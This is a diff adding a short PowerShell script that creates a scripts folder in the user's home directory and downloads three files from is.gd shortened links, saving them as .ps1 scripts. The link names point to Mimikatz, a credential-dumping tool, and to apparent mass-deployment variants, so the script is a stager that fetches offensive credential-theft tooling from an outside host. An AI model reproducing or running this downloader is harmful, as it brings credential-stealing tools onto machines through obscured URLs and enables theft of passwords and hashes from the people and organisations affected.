@@ -1,0 +1,18 @@
+$HOMEDIR=$HOME + "\scripts"
+$urls="http://is.gd/massmimi","http://is.gd/masssearch","http://is.gd/mimikatz"
+
+If (!(Test-Path $HOMEDIR)) {
+New-Item -Path $HOMEDIR -ItemType Directory
+}
+else {
+Write-Host "Directory already exists!"
+}
+
+
+
+foreach ($url in $urls) {
+   $urlFilename=$url.Split("/")[3]
+   $outFileName="$HOMEDIR"+"\"+"$urlFilename"+".ps1"
+   Invoke-WebRequest $url -OutFile $outFileName
+  
+    }
